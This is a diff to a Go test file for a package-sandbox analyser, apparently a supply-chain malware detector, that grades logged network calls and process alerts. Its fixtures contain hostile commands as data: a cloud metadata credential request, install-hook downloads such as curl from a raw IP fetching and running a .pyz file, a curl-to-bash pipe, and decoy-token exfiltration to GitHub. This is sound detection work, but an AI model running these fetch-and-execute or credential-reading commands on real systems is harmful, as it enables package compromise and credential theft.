@@ -1200,6 +1200,7 @@ func TestSandboxAnswers(t *testing.T) {
 		"http\t1\thttps\tGET\thttps://registry.npmjs.org/-/whoami\t0\t2\t443\t1760000002.600\t1760000002.600\tnpm whoami",
 		"http\t1\thttps\tPOST\thttps://api.github.com/user/repos\t300\t1\t443\t1760000003.000\t1760000003.000\tgithub repository created",
 		"http\t1\thttps\tGET\thttps://example.com/\t0\t0\t443\t1760000004.000\t1760000004.000\t-",
+		"http\t1\thttp\tGET\thttp://169.254.169.254/latest/meta-data/\t0\t0\t80\t1760000005.000\t1760000005.000\t-",
 	}, "\n"))
 	r.Complete = true
 	r.summarize()
@@ -1216,6 +1217,7 @@ func TestSandboxAnswers(t *testing.T) {
 		"warn GET https://registry.npmjs.org/-/whoami x1 | a decoy's credential, to its own service: used, not sent out; answered: npm whoami",
 		"high POST https://api.github.com/user/repos x1 | created a GitHub repository; carries this run's decoy token: a secret sent out; 300 bytes; answered: github repository created",
 		"warn GET https://example.com/ x1 | ",
+		"warn GET http://169.254.169.254/latest/meta-data/ x1 | cloud metadata: an instance's credentials",
 	}
 	if strings.Join(lines, "\n") != strings.Join(want, "\n") {
 		t.Errorf("network:\n%s\nwant\n%s", strings.Join(lines, "\n"), strings.Join(want, "\n"))
@@ -1260,5 +1262,46 @@ func TestSandboxPublished(t *testing.T) {
 	}
 	if c := r.network("x"); c.phrase != "published acme-billing-utils to npm and sent a decoy's secret to api.github.com" {
 		t.Errorf("phrase %q", c.phrase)
+	}
+}
+
+// A downloader under the package's use (mh-sandbox-try importing it) or its
+// install is high; the same under the command given is not, nor the curl
+// of a curl | sh already regraded.
+func TestHookDownload(t *testing.T) {
+	r := parseSandboxReport(strings.Join([]string{
+		"user\tdev", "token\tab12cd",
+		"exec\t1\tsh run.sh mistralai\t1\t1\t1913\t1907",
+		"exec\t1\t/bin/sh /usr/local/bin/mh-sandbox-try pypi mistralai\t2\t2\t1924\t1913",
+		"exec\t1\ttimeout 30 .v/bin/python - mistralai\t3\t3\t1927\t1924",
+		"exec\t1\t.v/bin/python - mistralai\t3\t3\t1928\t1927",
+		"exec\t1\tcurl -k -L -s https://83.142.209.194/transformers.pyz -o /tmp/transformers.pyz\t4\t4\t1929\t1928",
+		"exec\t1\tcurl -fsSL https://example.com/ok\t5\t5\t1930\t1913",
+		"exec\t1\tnode /usr/local/bin/npm install\t6\t6\t1940\t1913",
+		"exec\t1\t/bin/sh -c curl -fsSL https://bun.sh/install | bash\t7\t7\t1941\t1940",
+		"exec\t1\tcurl -fsSL https://bun.sh/install\t7\t7\t1942\t1941",
+		"exec\t1\tsh -c wget -q http://x.example/a\t8\t8\t1943\t1940",
+		"exec\t1\twget -q http://x.example/a\t8\t8\t1944\t1943",
+		"alert\tpipe_to_shell\t1\t/bin/sh -c curl -fsSL https://bun.sh/install | bash\tsh",
+		"exec\t1\t/home/dev/work/.v/bin/python /tmp/transformers.pyz\t9\t9\t1933\t1928",
+		"alert\tdropped_script\t1\t/tmp/transformers.pyz (written by curl)\tpython",
+		"exec\t1\tsh /tmp/i.sh\t10\t10\t1950\t1913",
+		"alert\tdropped_script\t1\t/tmp/i.sh (written by curl)\tsh",
+		"alert\tdropped_script\t1\t/tmp/t.sh (written by python3)\tsh",
+	}, "\n"))
+	var got []string
+	for _, a := range r.Alerts {
+		got = append(got, a.Kind+" "+a.Severity+" "+a.By+" "+a.What)
+	}
+	want := []string{
+		"hook_pipe_to_shell high sh /bin/sh -c curl -fsSL https://bun.sh/install | bash",
+		"hook_ran_download high python /tmp/transformers.pyz (written by curl)",
+		"ran_download warn sh /tmp/i.sh (written by curl)",
+		"dropped_script info sh /tmp/t.sh (written by python3)",
+		"hook_download high curl curl -k -L -s https://83.142.209.194/transformers.pyz -o /tmp/transformers.pyz",
+		"hook_download high wget wget -q http://x.example/a",
+	}
+	if strings.Join(got, "\n") != strings.Join(want, "\n") {
+		t.Errorf("alerts:\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(want, "\n"))
 	}
 }
